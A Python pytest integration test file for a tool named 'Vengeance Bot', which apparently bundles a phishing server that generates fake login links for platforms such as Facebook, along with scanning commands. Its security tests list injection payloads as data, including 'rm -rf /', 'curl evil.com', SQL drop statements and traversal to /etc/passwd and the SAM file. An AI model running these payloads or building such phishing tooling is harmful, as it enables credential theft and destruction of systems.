#!/usr/bin/env python3
"""
Integration Tests for Vengeance Bot
"""

import pytest
import asyncio
import threading
import time
import requests
import json
import subprocess
from datetime import datetime

class TestIntegration:
    """Integration test suite"""
    
    @pytest.fixture(scope="module")
    def vengeance_app(self):
        """Start Vengeance Bot for integration testing"""
        from vengeance import VengeanceBot
        
        app = VengeanceBot()
        
        # Start the app in a separate thread
        def run_app():
            app.run()
        
        thread = threading.Thread(target=run_app, daemon=True)
        thread.start()
        
        # Wait for app to start
        time.sleep(5)
        
        yield app
        
        # Cleanup
        app.running = False
        app.phishing_server.stop()
        app.db.close()
    
    def test_web_dashboard_access(self, vengeance_app):
        """Test web dashboard accessibility"""
        try:
            response = requests.get('http://localhost:5000', timeout=5)
            assert response.status_code == 200
            assert 'Vengeance Bot' in response.text or 'VENGEANCE' in response.text
        except Exception as e:
            pytest.skip(f"Web server not accessible: {e}")
    
    def test_phishing_server_start_stop(self, vengeance_app):
        """Test phishing server operations"""
        # Generate a phishing link first
        from vengeance import CommandHandler
        result = vengeance_app.handler.execute('generate_phishing_link facebook')
        
        if result['success']:
            # Extract link ID
            import re
            match = re.search(r'Link ID: (\w+)', result['output'])
            if match:
                link_id = match.group(1)
                # Start server
                start_result = vengeance_app.handler.execute(f'phishing_start {link_id}')
                assert start_result['success'] == True or 'already' in start_result['output'].lower()
                
                # Stop server
                stop_result = vengeance_app.handler.execute('phishing_stop')
                assert stop_result['success'] == True
    
    def test_database_integration(self, vengeance_app):
        """Test database operations integration"""
        # Execute a command to populate database
        vengeance_app.handler.execute('test_command_for_integration')
        
        # Check if command was logged
        vengeance_app.db.cursor.execute('SELECT * FROM command_history WHERE command LIKE "%integration%"')
        result = vengeance_app.db.cursor.fetchone()
        # Command may not be logged if it's invalid, but database should work
        assert vengeance_app.db.conn is not None
    
    def test_multiple_commands_sequence(self, vengeance_app):
        """Test executing multiple commands in sequence"""
        commands = ['help', 'status', 'time', 'date', 'crunch_charsets']
        
        for cmd in commands:
            result = vengeance_app.handler.execute(cmd)
            assert result['success'] == True
            assert 'execution_time' in result
    
    def test_error_handling(self, vengeance_app):
        """Test error handling for invalid inputs"""
        invalid_commands = [
            'scan',  # missing target
            'ssh_add',  # missing parameters
            'generate_phishing_link',  # missing platform
            'traffic_icmp',  # missing parameters
            'nikto',  # missing target
        ]
        
        for cmd in invalid_commands:
            result = vengeance_app.handler.execute(cmd)
            assert result['success'] == False or 'usage' in result['output'].lower()
    
    @pytest.mark.asyncio
    async def test_concurrent_requests(self, vengeance_app):
        """Test handling concurrent requests"""
        import concurrent.futures
        
        def execute_command(cmd):
            return vengeance_app.handler.execute(cmd)
        
        commands = ['help', 'status', 'time'] * 10
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(execute_command, cmd) for cmd in commands]
            results = [f.result() for f in futures]
        
        # All commands should succeed
        assert all(r['success'] for r in results)
    
    def test_persistence(self, vengeance_app):
        """Test data persistence across operations"""
        # Add test data
        test_command = f"test_persistence_{datetime.now().timestamp()}"
        vengeance_app.handler.execute(test_command)
        
        # Verify it's in database
        vengeance_app.db.cursor.execute('SELECT * FROM command_history WHERE command = ?', (test_command,))
        result = vengeance_app.db.cursor.fetchone()
        assert result is not None
        assert result['command'] == test_command

class TestSecurityIntegration:
    """Security-focused integration tests"""
    
    @pytest.fixture
    def app(self):
        from vengeance import VengeanceBot
        app = VengeanceBot()
        yield app
        app.db.close()
    
    def test_sql_injection_prevention(self, app):
        """Test SQL injection prevention"""
        malicious_inputs = [
            "'; DROP TABLE command_history; --",
            "'; DELETE FROM scans WHERE 1=1; --",
            "' OR '1'='1",
            "1'; UPDATE users SET password='hacked' --"
        ]
        
        for malicious in malicious_inputs:
            result = app.handler.execute(malicious)
            # Should not crash or execute SQL
            assert result is not None
            # Check database still intact
            app.db.cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='command_history'")
            assert app.db.cursor.fetchone() is not None
    
    def test_command_injection_prevention(self, app):
        """Test command injection prevention"""
        # These should be treated as commands, not executed as shell
        injections = [
            "test; rm -rf /",
            "ping 127.0.0.1 && cat /etc/passwd",
            "help | sudo su",
            "status || curl evil.com"
        ]
        
        for injection in injections:
            result = app.handler.execute(injection)
            # Should handle safely
            assert result is not None
            # Verify system is intact
            import os
            assert os.path.exists('.vengeance')
    
    def test_path_traversal_prevention(self, app):
        """Test path traversal prevention"""
        path_traversals = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
        ]
        
        for traversal in path_traversals:
            result = app.handler.execute(f"cat {traversal}")
            # Should not expose sensitive files
            assert result is not None

class TestPerformanceIntegration:
    """Performance integration tests"""
    
    @pytest.fixture
    def app(self):
        from vengeance import VengeanceBot
        app = VengeanceBot()
        yield app
        app.db.close()
    
    def test_command_execution_performance(self, app):
        """Test command execution time"""
        start_time = time.time()
        result = app.handler.execute('help')
        execution_time = time.time() - start_time
        
        assert result['success'] == True
        assert execution_time < 2.0  # Should execute in under 2 seconds
    
    def test_multiple_command_performance(self, app):
        """Test performance with multiple commands"""
        times = []
        
        for i in range(20):
            start = time.time()
            app.handler.execute('status')
            times.append(time.time() - start)
        
        average_time = sum(times) / len(times)
        max_time = max(times)
        
        assert average_time < 1.0  # Average under 1 second
        assert max_time < 5.0  # Max under 5 seconds
    
    def test_database_query_performance(self, app):
        """Test database query performance"""
        # Insert test data
        for i in range(100):
            app.db.log_command(f"test_{i}", "local", True, "output", 0.1)
        
        # Query performance
        start_time = time.time()
        app.db.get_statistics()
        query_time = time.time() - start_time
        
        assert query_time < 0.5  # Query under 0.5 seconds

def run_integration_tests():
    """Run all integration tests"""
    pytest.main([__file__, '-v', '--tb=short'])

if __name__ == "__main__":
    run_integration_tests()